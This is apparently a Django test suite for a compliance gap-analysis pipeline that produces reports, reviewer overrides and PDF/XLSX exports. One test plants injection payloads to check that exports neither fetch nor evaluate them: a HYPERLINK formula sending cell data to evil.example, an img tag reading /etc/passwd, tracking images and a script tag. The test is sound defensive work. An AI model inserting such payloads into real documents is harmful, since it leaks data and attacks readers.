############################################################
#  [*] Tests — the gap-analysis pipeline, end to end
#
#  A company with a credential and a policy, one ingested act,
#  POST /api/reports, the worker runs the report — with the
#  fake model and embedder (tests/fakes.py). Then the review
#  override, the exports, the guards and the failure paths,
#  what the run's steps record of their model calls, the
#  documents a gap-analysis call carries (all of them whole,
#  or the nearest of a set too large), the place a quoted
#  passage is found at and served with (the passages of
#  reports written before included), and the parts of the
#  pipeline that need no database: locating a quote and
#  packing the open findings into planning calls.
############################################################


import io
import re
import uuid
from datetime import timedelta
from decimal import Decimal
from types import SimpleNamespace
from unittest import mock


from django.db import connection
from django.test import SimpleTestCase, TestCase
from django.test.utils import CaptureQueriesContext


from compliance.analysis.pdf import _company_name, _prose as pdf_prose, render_html
from compliance.analysis.models import Action, Finding, Report, ReportAct
from compliance.analysis.pipeline import locate_quote, plan_parts
from compliance.assistant.models import LlmCall
from compliance.companies.models import Company, CompanyDocument, CompanyDocumentChunk
from compliance.corpus.models import LegalDocument, Obligation
from compliance.assistant.usage import record_call
from compliance.jobs.models import Job, JobStep
from compliance.jobs.runner import recover_stale, run_once
from compliance.common.timestamps import utc_now
from compliance.prompts.store import active_version, seed_defaults
from compliance.tests.fakes import fake_models
from compliance.tests.test_corpus import EU_EN, ingest_act
from compliance.tests.utils import create_admin, create_user, post_json, signed_in


POLICY = """ATITIKTIES POLITIKA
1. Bendrosios nuostatos
Atitikties pareigūnas atsiskaito valdybai ir yra nepriklausomas.
2. Leidimai
Įmonė turi Lietuvos banko išduotą kriptoturto paslaugų teikėjo leidimą.
"""








############################################################
# render_pdf_html
############################################################
#
# The export HTML of a report, read fresh.
#
# Used by:
#   - the test cases below
############################################################

def render_pdf_html(report_id):
    return render_html(Report.objects.get(id=report_id))








############################################################
# drain
############################################################
#
# Runs queued jobs until the queue is empty.
#
# Used by:
#   - the test cases below
############################################################

def drain():
    while run_once(heartbeat=False):
        pass








class PipelineTests(TestCase):

    def setUp(self):
        seed_defaults()
        self.admin_client = signed_in(create_admin())
        self.user = create_user()
        self.client_user = signed_in(self.user)
        self.company = post_json(self.client_user, "/api/companies",
                                 {"name": "UAB Kripto", "institutionType": "casp", "usesAi": False}).json()
        post_json(self.client_user, f"/api/companies/{self.company['id']}/credentials",
                  {"kind": "license", "name": "CASP licencija", "issuer": "Lietuvos bankas"})
        upload = io.BytesIO(POLICY.encode())
        upload.name = "politika.md"
        self.client_user.post("/api/documents", {"file": upload, "companyId": self.company["id"]})

    def _start(self, **extra):
        return post_json(self.client_user, "/api/reports", {"companyId": self.company["id"], "language": "lt", **extra})

    def test_empty_corpus_and_budget_guards(self):
        self.assertEqual(self._start().json()["code"], "CORPUS_EMPTY")
        with fake_models():
            ingest_act(self.admin_client, EU_EN, title="Markets in crypto-assets", short_title="MiCA",
                       external_id="32023R1114")
        self.user.daily_budget_usd = Decimal("0.10")
        self.user.save(update_fields=["daily_budget_usd"])
        self.assertEqual(self._start().status_code, 429)
        self.user.daily_budget_usd = None
        self.user.save(update_fields=["daily_budget_usd"])
        self.assertEqual(self._start().status_code, 201)
        self.assertEqual(self._start().json()["code"], "ALREADY_RUNNING")
        self.assertEqual(post_json(self.client_user, "/api/reports",
                                   {"companyId": self.company["id"], "language": "de"}).status_code, 400)

    def test_full_run_review_and_exports(self):
        with fake_models() as model:
            ingest_act(self.admin_client, EU_EN, title="Markets in crypto-assets", short_title="MiCA",
                       external_id="32023R1114")
            started = self._start()
            self.assertEqual(started.status_code, 201, started.content)
            drain()
        report = Report.objects.get(id=started.json()["id"])
        self.assertEqual(report.status, "done", report.error)
        self.assertEqual(report.title, "Atitikties vertinimas")
        self.assertEqual(ReportAct.objects.filter(report=report, applicability="applies").count(), 1)
        findings = list(Finding.objects.filter(report=report).order_by("order"))
        self.assertTrue(findings)
        self.assertEqual(findings[0].status, "missing", "the worst status sorts first")
        self.assertTrue(all(not f.obligation_reviewed for f in findings), "machine-proposed obligations")
        self.assertEqual(findings[0].evidence[0]["kind"], "credential")
        self.assertTrue(findings[0].citations[0]["url"].startswith("https://eur-lex.europa.eu/"))
        self.assertTrue(Action.objects.filter(report=report).exists())
        stats = report.stats
        self.assertEqual(stats["reviewedObligations"], 0)
        self.assertIn("report.gap_analysis", [p["slug"] for p in stats["provenance"]["prompts"]])
        self.assertEqual(stats["provenance"]["corpus"][0]["act"], "MiCA")
        profile_prompt = next(prompt for name, prompt in model.calls if name == "applicability")
        self.assertEqual(next(text for name, text in model.shared if name == "applicability"),
                         profile_prompt[:profile_prompt.index("\n\nACTS TO ASSESS\n")],
                         "the profile is the applicability calls' shared data")
        self.assertIn("Uses AI systems: no", profile_prompt)
        self.assertIn("provides AI systems: unknown (not stated)", profile_prompt)
        self.assertIn("CLAIMED by the company, not verified", profile_prompt)

        # The full report, the reviewer's override and the exports
        full = self.client_user.get(f"/api/reports/{report.id}").json()
        self.assertEqual(len(full["findings"]), len(findings))
        target = full["findings"][0]
        r = self.client_user.patch(f"/api/reports/{report.id}/findings/{target['id']}",
                                   data={"overrideStatus": "met", "reviewerNote": "Licencija patikrinta registre"},
                                   content_type="application/json")
        self.assertEqual((r.json()["effectiveStatus"], r.json()["status"]), ("met", "missing"))
        self.assertEqual(self.client_user.patch(f"/api/reports/{report.id}/findings/{target['id']}",
                                                data={"overrideStatus": "great"},
                                                content_type="application/json").status_code, 400)
        # The stored counts follow the review — the list row, the
        # cover page and the exports read them
        before, after = stats["findings"], Report.objects.get(id=report.id).stats["findings"]
        self.assertEqual(after["missing"], before["missing"] - 1)
        self.assertEqual(after["met"], before["met"] + 1)
        listed = next(r for r in self.client_user.get("/api/reports").json()["reports"] if r["id"] == report.id)
        self.assertEqual(listed["stats"]["findings"], after)
        # The list is narrowed by state on the server, before it is cut to the newest 200
        ids = lambda query: [r["id"] for r in self.client_user.get(f"/api/reports?{query}").json()["reports"]]
        self.assertIn(report.id, ids("status=done"))
        self.assertIn(report.id, ids(f"status=done&companyId={self.company['id']}"))
        self.assertEqual((ids("status=failed"), ids("status=no-such-state")), ([], []))
        severity = findings[0].severity
        if severity in ("critical", "high", "medium", "low"):
            self.assertEqual(Report.objects.get(id=report.id).stats["openBySeverity"][severity],
                             stats["openBySeverity"][severity] - 1)
        # Clearing the override counts the model's verdict again
        self.client_user.patch(f"/api/reports/{report.id}/findings/{target['id']}", data={"overrideStatus": None},
                               content_type="application/json")
        self.assertEqual(Report.objects.get(id=report.id).stats["findings"], before)
        self.client_user.patch(f"/api/reports/{report.id}/findings/{target['id']}", data={"overrideStatus": "met"},
                               content_type="application/json")
        pdf = self.client_user.get(f"/api/reports/{report.id}/export?format=pdf")
        self.assertEqual(pdf.status_code, 200)
        self.assertTrue(pdf.content.startswith(b"%PDF"))
        self.assertIn("attachment;", pdf["Content-Disposition"])
        xlsx = self.client_user.get(f"/api/reports/{report.id}/export?format=xlsx")
        self.assertEqual(xlsx.status_code, 200)
        self.assertTrue(xlsx.content.startswith(b"PK"))
        from openpyxl import load_workbook
        book = load_workbook(io.BytesIO(xlsx.content))
        self.assertEqual(len(book.sheetnames), 6)
        findings_sheet = book[book.sheetnames[3]]
        self.assertEqual(findings_sheet["E2"].value, "Atitinka", "the reviewer's override is what exports")

        # The sign-off: approve, then an override withdraws it
        r = self.client_user.patch(f"/api/reports/{report.id}", data={"approved": True, "note": "Peržiūrėta <b>"},
                                   content_type="application/json")
        self.assertEqual(r.json()["approvedBy"], self.user.id)
        self.assertEqual(r.json()["approvedByName"], self.user.display_name)
        html = render_pdf_html(report.id)
        self.assertIn("Peržiūrėta &lt;b&gt;", html)
        # The PDF reads from the conclusion down, and a model's
        # passage marks stay out of it
        self.assertEqual(re.findall(r'<section id="(\w+)">', html),
                         ["glance", "summary", "actions", "profile", "acts", "findings", "citations", "methodology"])
        self.assertEqual(pdf_prose("Tvarka nustatyta [D4#2]. Termino nėra [C1, D7#3]."), "Tvarka nustatyta. Termino nėra.")
        # Where the reader is: the act of the findings is a numbered
        # sub-heading that the contents list and the page margin
        # repeats, a card names the act before its provision, the
        # foot of a page carries the mark, and one group of acts
        # needs no number
        self.assertIn('<div class="who">UAB Kripto</div>', html)
        self.assertRegex(html, r'<div class="running"><svg[^>]*>.*?</svg>Atitikties asistentas · \d{4}-\d{2}-\d{2}</div>')
        self.assertIn('<li><a href="#findings-1"><span class="no">6.1</span> MiCA</a></li>', html)
        self.assertIn('<h3 id="findings-1" data-sub=" · MiCA"><span class="no">6.1</span> MiCA</h3>', html)
        self.assertRegex(html, r'<span class="cite">(<a href="[^"]+">)?MiCA \S')
        self.assertNotIn('id="acts-1"', html)
        self.assertIn('<a href="#methodology-2"><span class="no">8.2</span> Kilmė</a>', html)
        self.client_user.patch(f"/api/reports/{report.id}/findings/{target['id']}",
                               data={"reviewerNote": "Papildyta"}, content_type="application/json")
        self.assertIsNone(self.client_user.get(f"/api/reports/{report.id}").json()["approvedAt"])
        self.assertEqual(self.client_user.patch(f"/api/reports/{report.id}", data={"approved": "yes"},
                                                content_type="application/json").status_code, 400)

        # A newer version of an act the report read marks it outdated
        self.assertEqual(self.client_user.get(f"/api/reports/{report.id}").json()["outdatedActs"], [])
        with fake_models():
            upload = io.BytesIO((EU_EN + "\nPart B: Other information").encode())
            upload.name = "MiCA.txt"
            mica = LegalDocument.objects.get(short_title="MiCA")
            self.admin_client.post(f"/api/corpus/documents/{mica.id}/upload", {"file": upload})
            drain()
        self.assertEqual(self.client_user.get(f"/api/reports/{report.id}").json()["outdatedActs"], ["MiCA"])

        # Tenancy: a stranger sees nothing
        stranger = signed_in(create_user(email="kitas@knf.vu.lt"))
        self.assertEqual(stranger.get(f"/api/reports/{report.id}").status_code, 404)
        self.assertEqual(stranger.get(f"/api/reports/{report.id}/export?format=pdf").status_code, 404)

    def test_the_gap_analysis_reads_every_document_whole_and_the_same_in_every_call(self):
        upload = io.BytesIO(b"The CASP must be authorised: we obtain authorisation before any CASP service.")
        upload.name = "authorisation-policy.md"
        self.client_user.post("/api/documents", {"file": upload, "companyId": self.company["id"]})
        # One obligation to a call, so the run makes several
        with fake_models() as model, mock.patch("compliance.analysis.pipeline.OBLIGATIONS_PER_CALL", 1):
            ingest_act(self.admin_client, EU_EN, title="Markets in crypto-assets", short_title="MiCA",
                       external_id="32023R1114")
            started = self._start()
            drain()
        report = Report.objects.get(id=started.json()["id"])
        self.assertEqual(report.status, "done", report.error)
        prompts = [prompt for name, prompt in model.calls if name == "findings"]
        self.assertGreater(len(prompts), 1)
        # The profile and the documents are the step's shared data,
        # the same in every call — what the provider reads from its
        # cache — and each call adds its act and obligations
        shared = {text for name, text in model.shared if name == "findings"}
        self.assertEqual(len(shared), 1)
        block = shared.pop()
        self.assertTrue(block.startswith("COMPANY\n"))
        self.assertTrue(all(prompt.startswith(f"{block}\n\nACT: Markets in crypto-assets\n") for prompt in prompts))
        documents = list(CompanyDocument.objects.filter(company_id=self.company["id"]).order_by("uploaded_at"))
        self.assertEqual(re.findall(r'<document ref="(D\d+)" title="([^"]*)" kind="policy">', block),
                         [("D1", documents[0].title), ("D2", documents[1].title)])
        for document in documents:
            self.assertIn(f">\n{document.text}\n</document>", block, "whole, not its nearest passages")
        self.assertEqual({prompt.count("<obligation ref=") for prompt in prompts}, {1})
        self.assertEqual(JobStep.objects.get(job=report.job, name="gap_analysis").output["documents"], "all")

    def test_a_document_set_too_large_for_a_call_is_cut_to_the_documents_nearest_to_its_obligations(self):
        # A long procedure whose one section speaks of what the
        # fake obligations ask ("A CASP must be authorised."), among
        # sections that do not
        filler = "\n\n".join(f"{n}. Atostogų suteikimo tvarka ir darbuotojų prašymų nagrinėjimo terminai skyriuje {n}."
                             for n in range(1, 40))
        near = " ".join(["The CASP must be authorised. We obtain authorisation before any CASP service."] * 12)
        upload = io.BytesIO(f"{filler}\n\n{near}\n\n{filler}".encode())
        upload.name = "procedures.md"
        self.client_user.post("/api/documents", {"file": upload, "companyId": self.company["id"]})
        with fake_models() as model, mock.patch("compliance.analysis.pipeline.DOCUMENT_PACK_CHARS", 3000):
            ingest_act(self.admin_client, EU_EN, title="Markets in crypto-assets", short_title="MiCA",
                       external_id="32023R1114")
            started = self._start()
            drain()
        report = Report.objects.get(id=started.json()["id"])
        self.assertEqual(report.status, "done", report.error)
        self.assertEqual(JobStep.objects.get(job=report.job, name="gap_analysis").output["documents"], "nearest")
        long = CompanyDocument.objects.get(company_id=self.company["id"], title__contains="procedures")
        self.assertGreater(len(long.text), 3000)
        # Only the profile is shared now; each call brings its own
        # documents
        self.assertEqual({text.startswith("COMPANY\n") and "DOCUMENTS" not in text for name, text in model.shared
                          if name == "findings"}, {True})
        for prompt in (prompt for name, prompt in model.calls if name == "findings"):
            block = prompt[prompt.index("\n\nDOCUMENTS\n"):prompt.index("\n\nACT: ")]
            # Too long for the call, it goes in its nearest passages
            # only, and says so
            excerpt = re.search(r'<document ref="D2" title="[^"]*" kind="policy" excerpts="yes">\n(.*?)\n</document>',
                                block, re.S)
            self.assertTrue(excerpt, block[:300])
            self.assertIn("The CASP must be authorised.", excerpt.group(1))
            self.assertLess(len(block), 3000 + 400)
            # Every document stays in the profile's list, by title
            self.assertIn(f'[D2] "{long.title}"', prompt[:prompt.index("\n\nDOCUMENTS\n")])
        self.assertTrue(all(o.embedding_en is not None for o in Obligation.objects.all()),
                        "the ranking reads both of an obligation's vectors")

    def test_a_quote_is_placed_in_its_document_and_one_the_document_does_not_hold_gets_no_place(self):
        with fake_models():
            ingest_act(self.admin_client, EU_EN, title="Markets in crypto-assets", short_title="MiCA",
                       external_id="32023R1114")
            report_id = self._start().json()["id"]
            drain()
        report = Report.objects.get(id=report_id)
        self.assertEqual(report.status, "done", report.error)
        document = CompanyDocument.objects.get(company_id=self.company["id"])
        findings = list(Finding.objects.filter(report=report).order_by("order"))
        credential, placed, unplaced = findings[0].evidence
        self.assertEqual(credential["kind"], "credential")
        self.assertEqual(placed, {"kind": "passage", "id": document.id, "title": document.title,
                                  "quote": "„ATITIKTIES POLITIKA“", "start": 0})
        self.assertEqual((unplaced["quote"], unplaced["start"]), ("Šio sakinio dokumente nėra.", None))
        output = JobStep.objects.get(job=report.job, name="gap_analysis").output
        self.assertEqual((output["quotesPlaced"], output["quotesUnplaced"]), (len(findings), len(findings)))

        # Served with the place as charStart — no chunk is asked
        with CaptureQueriesContext(connection) as queries:
            served = self.client_user.get(f"/api/reports/{report.id}").json()["findings"][0]["evidence"]
        self.assertFalse([q for q in queries.captured_queries if "company_document_chunks" in q["sql"]])
        self.assertEqual(served[1], {"kind": "passage", "id": document.id, "title": document.title,
                                     "quote": "„ATITIKTIES POLITIKA“", "documentId": document.id, "charStart": 0})
        self.assertEqual((served[2]["documentId"], served[2]["charStart"]), (document.id, None))
        self.assertNotIn("start", served[2])

    def test_a_findings_severity_is_its_obligations_own(self):
        with fake_models():
            ingest_act(self.admin_client, EU_EN, title="Markets in crypto-assets", short_title="MiCA",
                       external_id="32023R1114")
            # The first run extracts the obligations; then the
            # register's weights, as an admin's review left them
            self._start()
            drain()
            for position, obligation in enumerate(Obligation.objects.order_by("created_at")):
                Obligation.objects.filter(id=obligation.id).update(severity=("low", "high")[position % 2])
            report_id = self._start().json()["id"]
            drain()
        findings = Finding.objects.filter(report_id=report_id).select_related("obligation")
        self.assertTrue(findings)
        self.assertEqual({(f.severity, f.obligation.severity) for f in findings}, {("low", "low"), ("high", "high")})

    def test_what_the_model_leaves_out_is_said_in_the_reports_language(self):
        with fake_models() as model:
            ingest_act(self.admin_client, EU_EN, title="Markets in crypto-assets", short_title="MiCA",
                       external_id="32023R1114")
            # The model answers the gap analysis with no finding at all
            model._findings = lambda prompt: {"findings": []}
            lithuanian = self._start().json()["id"]
            drain()
            english = self._start(language="en").json()["id"]
            drain()
            # ... and the applicability with no verdict
            model._applicability = lambda prompt: {"acts": []}
            unjudged = self._start().json()["id"]
            drain()
        said = lambda report_id: {(f.status, f.analysis) for f in Finding.objects.filter(report_id=report_id)}
        self.assertEqual(said(lithuanian), {("unknown", "Modelis šios pareigos neįvertino.")})
        self.assertEqual(said(english), {("unknown", "The model did not assess this obligation.")})
        act = ReportAct.objects.get(report_id=unjudged, screened_out=False)
        self.assertEqual((act.applicability, act.reasoning), ("uncertain", "Modelis nepateikė šio akto taikymo vertinimo."))

    def test_exports_never_fetch_and_never_write_formulas(self):
        from compliance.analysis.exports import render_xlsx
        from compliance.analysis.pdf import render_html, render_pdf
        with fake_models():
            ingest_act(self.admin_client, EU_EN, title="Markets in crypto-assets", short_title="MiCA",
                       external_id="32023R1114")
            report_id = self._start().json()["id"]
            drain()
        report = Report.objects.get(id=report_id)
        Finding.objects.filter(report=report).update(
            analysis='=HYPERLINK("https://evil.example/?x="&A1,"x")',
            recommendation='<img src="file:///etc/passwd"><img src="https://evil.example/pixel.png">')
        Report.objects.filter(id=report.id).update(summary='![x](https://evil.example/leak.png) <script>x</script>')
        report.refresh_from_db()
        html = render_html(report)
        self.assertNotIn("<img", html)
        self.assertNotIn("<script", html)
        with mock.patch("urllib.request.urlopen", side_effect=AssertionError("fetched")) as opened:
            self.assertTrue(render_pdf(report).startswith(b"%PDF"))
        opened.assert_not_called()
        from openpyxl import load_workbook
        book = load_workbook(io.BytesIO(render_xlsx(report)))
        cell = book[book.sheetnames[3]]["H2"]
        self.assertEqual(cell.data_type, "s")
        self.assertTrue(cell.value.startswith("=HYPERLINK"))
        self.assertEqual(self.client_user.get(f"/api/reports/{report.id}/export?format=doc").status_code, 400)

    def test_cancel_while_queued_and_dead_worker(self):
        with fake_models():
            ingest_act(self.admin_client, EU_EN, title="Markets in crypto-assets", short_title="MiCA",
                       external_id="32023R1114")
        report_id = self._start().json()["id"]
        r = self.client_user.post(f"/api/reports/{report_id}/cancel")
        self.assertEqual(r.json()["status"], "cancelled")
        self.assertEqual(self.client_user.post(f"/api/reports/{report_id}/cancel").status_code, 409)

        # A report whose worker died (max_attempts 1) fails instead of hanging
        report_id = self._start().json()["id"]
        job = Report.objects.get(id=report_id).job
        Job.objects.filter(id=job.id).update(status="running", attempts=1, locked_by="dead",
                                             heartbeat_at=utc_now() - timedelta(minutes=10))
        Report.objects.filter(id=report_id).update(status="running")
        JobStep.objects.create(id="s1", job=job, ordinal=1, name="profile", status="running", started_at=utc_now())
        self.assertEqual(recover_stale(), 1)
        self.assertEqual(Report.objects.get(id=report_id).status, "failed")
        self.assertEqual(JobStep.objects.get(id="s1").status, "failed")
        self.assertEqual(Job.objects.get(id=job.id).status, "failed")

    def test_estimate_before_and_after_extraction(self):
        with fake_models():
            ingest_act(self.admin_client, EU_EN, title="Markets in crypto-assets", short_title="MiCA",
                       external_id="32023R1114")
        prices = {"gateway:azure/gpt-6-astra": (Decimal("0.00001"), Decimal("0.00005")),
                  "gateway:azure/gpt-6.1-sol": (Decimal("0.000002"), Decimal("0.00001"))}
        with mock.patch("compliance.assistant.usage.price_table", return_value=prices):
            before = self.client_user.get(f"/api/reports/estimate?companyId={self.company['id']}").json()
        self.assertEqual((before["acts"], before["actsToExtract"]), (1, ["MiCA"]), before)
        self.assertGreaterEqual(before["extractionUsd"], 0, "a tiny fixture act rounds to cents")
        self.assertGreaterEqual(before["totalUsd"], before["analysisUsd"])
        self.assertGreater(before["analysisUsd"], 0)
        self.assertEqual(before["budget"]["unit"], "USD")
        with fake_models():
            self._start()
            drain()
        with mock.patch("compliance.assistant.usage.price_table", return_value=prices):
            after = self.client_user.get(f"/api/reports/estimate?companyId={self.company['id']}").json()
        self.assertEqual((after["actsToExtract"], after["extractionUsd"]), ([], 0.0))
        self.assertEqual(self.client_user.get("/api/reports/estimate?companyId=nope").status_code, 404)

    def test_the_estimate_refuses_the_scope_a_start_would_refuse(self):
        with fake_models():
            mica = ingest_act(self.admin_client, EU_EN, title="Markets in crypto-assets", short_title="MiCA",
                              external_id="32023R1114")
        priced = lambda ids: self.client_user.get(f"/api/reports/estimate?companyId={self.company['id']}&documentIds={ids}")
        self.assertEqual(priced(mica.id).status_code, 200)
        # Acts that are not there used to be priced as nothing, and the start then refused them
        unknown = priced(f"{mica.id},no-such-act")
        self.assertEqual((unknown.status_code, unknown.json()["code"]), (400, "INVALID_FIELD"))
        self.assertEqual(self._start(documentIds=[mica.id, "no-such-act"]).status_code, 400)

    def test_an_admin_lists_the_reports_of_their_own_companies_with_scope_own(self):
        with fake_models():
            ingest_act(self.admin_client, EU_EN, title="Markets in crypto-assets", short_title="MiCA",
                       external_id="32023R1114")
            report = self._start().json()
            drain()
        seen = lambda query="": [row["id"] for row in self.admin_client.get(f"/api/reports{query}").json()["reports"]]
        self.assertEqual(seen(), [report["id"]], "an admin sees every user's reports")
        self.assertEqual(seen("?scope=own"), [], "and none of them is of a company of their own")
        own = [row["id"] for row in self.client_user.get("/api/reports?scope=own").json()["reports"]]
        self.assertEqual(own, [report["id"]])

    def test_the_estimate_prices_the_documents_written_to_the_cache_once_and_read_after(self):
        from compliance.analysis import estimate
        company = Company.objects.get(id=self.company["id"])
        shared = estimate.GAP_PREFIX_TOKENS + int(len(CompanyDocument.objects.get(company=company).text)
                                                 / estimate.DOCUMENT_CHARS_PER_TOKEN)
        added, answer = estimate.GAP_CALL_TOKENS
        priced = []

        def cost_of(model, input_tokens, output_tokens, cached=0, written=0):
            priced.append((input_tokens, output_tokens, cached, written))
            return Decimal(1)

        with mock.patch("compliance.analysis.estimate.cost_of", side_effect=cost_of):
            # 31 obligations: three calls of fifteen. The first writes
            # the profile and the documents to the provider's cache,
            # the other two read them from it
            self.assertEqual(estimate._gap_price(company, 31), 2.0)
            self.assertEqual(priced, [(shared + added, answer, 0, shared + added),
                                      ((shared + added) * 2, answer * 2, shared * 2, added * 2)])
            self.assertEqual(estimate._gap_price(company, 0), 0.0)
            # A set too large to send whole: every call pays for a
            # block of its own
            del priced[:]
            with mock.patch("compliance.analysis.estimate.DOCUMENT_PACK_CHARS", 90):
                self.assertEqual(estimate._gap_price(company, 31), 3.0)
            self.assertEqual(priced, [(estimate.GAP_PREFIX_TOKENS + 20 + added, answer, 0,
                                       estimate.GAP_PREFIX_TOKENS + 20 + added)])

    def test_budget_counts_the_users_spend_in_dollars(self):
        from unittest import mock as _mock
        with _mock.patch("compliance.assistant.usage.price_table",
                         return_value={"gateway:fake-model": (Decimal("0.000005"), Decimal("0.00003"))}):
            record_call(kind="chat", model="gateway:fake-model", input_tokens=10_000, output_tokens=1_000,
                        user_id=self.user.id)
        budget = self.client_user.get("/api/usage").json()["budget"]
        self.assertEqual((budget["used"], budget["unit"], budget["limit"]), (0.08, "USD", 10.0))
        self.assertEqual(budget["remaining"], 9.92)

    def test_the_runs_steps_record_their_model_prompt_version_and_usage(self):
        with fake_models():
            ingest_act(self.admin_client, EU_EN, title="Markets in crypto-assets", short_title="MiCA",
                       external_id="32023R1114")
            report_id = self._start().json()["id"]
            drain()
        report = Report.objects.get(id=report_id)
        self.assertEqual(report.status, "done", report.error)
        steps = {step.name: step for step in JobStep.objects.filter(job=report.job)}
        for name, slug in (("applicability", "report.applicability"), ("gap_analysis", "report.gap_analysis"),
                           ("summary", "report.summary")):
            step, calls = steps[name], LlmCall.objects.filter(job_step_id=steps[name].id)
            self.assertEqual((step.model, step.prompt_version_id), ("gateway:fake-model", active_version(slug).id), name)
            self.assertEqual(step.usage["calls"], calls.count(), name)
            self.assertEqual(step.usage["inputTokens"], sum(c.input_tokens for c in calls), name)
            self.assertEqual(step.usage["outputTokens"], sum(c.output_tokens for c in calls), name)
        # The inventory ran on its one prompt version (an embedding
        # of the policy, if it ran there, on none)
        self.assertEqual(steps["documents"].prompt_version_id, active_version("report.inventory").id)
        # A step without a model call records none
        self.assertEqual((steps["profile"].model, steps["profile"].usage), (None, {}))
        # The jobs API serves them: every call of the run, counted once
        served = self.client_user.get(f"/api/jobs/{report.job_id}").json()["steps"]
        self.assertEqual(sum(step["usage"].get("calls", 0) for step in served),
                         LlmCall.objects.filter(job_step_id__in=[step["id"] for step in served]).count())

    def test_passages_are_served_with_where_they_start_even_in_reports_written_before(self):
        document = CompanyDocument.objects.get(company_id=self.company["id"])
        start = document.text.index("2. Leidimai")
        CompanyDocumentChunk.objects.bulk_create([
            CompanyDocumentChunk(id=str(uuid.uuid4()), document=document, ordinal=ordinal, char_start=at,
                                 text=document.text[at:at + 80])
            for ordinal, at in ((0, 0), (1, start))])
        # Stored as every run stores them: the chunk's document id
        # and ordinal, no offset
        report = Report.objects.create(id=str(uuid.uuid4()), company_id=self.company["id"], created_by=self.user,
                                       status="done", language="lt", stats={"findings": {}}, created_at=utc_now())
        passage = {"kind": "passage", "id": document.id, "chunk": 1, "title": document.title,
                   "quote": "Įmonė turi Lietuvos banko išduotą kriptoturto paslaugų teikėjo leidimą."}
        credential = {"kind": "credential", "id": "c-1", "title": "CASP licencija", "quote": "CASP licencija"}
        stored = ([credential, passage], [{**passage, "chunk": 7}], [{**passage, "chunk": 0}], [credential])
        for order, evidence in enumerate(stored, 1):
            Finding.objects.create(id=str(uuid.uuid4()), report=report, obligation_title=f"Pareiga {order}",
                                   status="missing", evidence=evidence, order=order)

        with CaptureQueriesContext(connection) as queries:
            full = self.client_user.get(f"/api/reports/{report.id}").json()
        self.assertEqual(len([q for q in queries.captured_queries if "company_document_chunks" in q["sql"]]), 1,
                         "one query for every passage of the report")
        served = [finding["evidence"] for finding in full["findings"]]
        self.assertEqual(served[0], [credential, {**passage, "documentId": document.id, "charStart": start}])
        self.assertEqual((served[1][0]["documentId"], served[1][0]["charStart"]), (document.id, None),
                         "a chunk that is gone has no start")
        self.assertEqual(served[2][0]["charStart"], 0)
        self.assertEqual(served[3], [credential], "other kinds go out as stored")
        self.assertNotIn("charStart", Finding.objects.get(id=full["findings"][0]["id"]).evidence[1],
                         "the stored evidence is left as it was")

        # The review's answer carries it too — the GUI swaps it in
        r = self.client_user.patch(f"/api/reports/{report.id}/findings/{full['findings'][0]['id']}",
                                   data={"reviewerNote": "Patikrinta"}, content_type="application/json")
        self.assertEqual(r.json()["evidence"][1]["charStart"], start)

        # A report citing no passage asks nothing of the chunks
        Finding.objects.filter(report=report).update(evidence=[credential])
        with CaptureQueriesContext(connection) as queries:
            self.client_user.get(f"/api/reports/{report.id}")
        self.assertFalse([q for q in queries.captured_queries if "company_document_chunks" in q["sql"]])








class PipelinePartsTests(SimpleTestCase):

    def test_the_pdf_names_a_company_with_its_legal_form(self):
        def named(name, form, snapshot=None):
            return _company_name(SimpleNamespace(company=SimpleNamespace(name=name, legal_form=form), profile_snapshot=snapshot))

        self.assertEqual(named("Kripto", "UAB"), "UAB Kripto")
        self.assertEqual(named("UAB Kripto", "uab"), "UAB Kripto", "a name that carries the form stays as it is")
        self.assertEqual(named("Baltic Labs", "AB"), "AB Baltic Labs", "letters inside a word are not the form")
        self.assertEqual(named("Kripto", "Ltd."), "Kripto Ltd.", "a form written after the name")
        self.assertEqual(named("Kripto", None), "Kripto")
        self.assertEqual(named("Kripto", "UAB", {"legalForm": "MB"}), "MB Kripto", "the profile the report ran on")

    def test_a_quote_is_found_across_line_breaks_and_without_the_models_marks(self):
        text = "1. Tikslas\nAtitikties pareigūnas atsiskaito\nvaldybai ir yra   nepriklausomas.\n2. Riba (10 %) taikoma."
        self.assertEqual(locate_quote(text, "„Atitikties pareigūnas atsiskaito valdybai ir yra nepriklausomas…“"), 11)
        self.assertEqual(locate_quote(text, '"2. Riba (10 %) taikoma."'), text.index("2. Riba"))
        self.assertEqual(locate_quote(text, "(10 %)"), text.index("(10 %)"), "a quote is text, not a pattern")
        self.assertIsNone(locate_quote(text, "Atitikties pareigūnas atsiskaito direktoriui"))
        self.assertIsNone(locate_quote(text, " … "))
        self.assertIsNone(locate_quote("", "Tikslas"))

    def test_open_findings_go_to_planning_calls_by_theme_every_one_once(self):
        def findings(category, count):
            return [SimpleNamespace(id=f"{category}-{n}", category=category) for n in range(count)]

        given = findings("aml", 7) + findings("ict_risk", 4) + findings("governance", 3) + findings("reporting", 23)
        with mock.patch("compliance.analysis.pipeline.PLAN_FINDINGS_PER_CALL", 10):
            parts = plan_parts(given)
        # The largest theme first, cut to the size of a call; the
        # smaller ones packed together whole
        self.assertEqual([[(theme, len(rows)) for theme, rows in part] for part in parts],
                         [[("reporting", 10)], [("reporting", 10)], [("reporting", 3), ("aml", 7)],
                          [("ict_risk", 4), ("governance", 3)]])
        planned = [f.id for part in parts for _, rows in part for f in rows]
        self.assertEqual(sorted(planned), sorted(f.id for f in given))
        self.assertEqual(plan_parts([]), [])
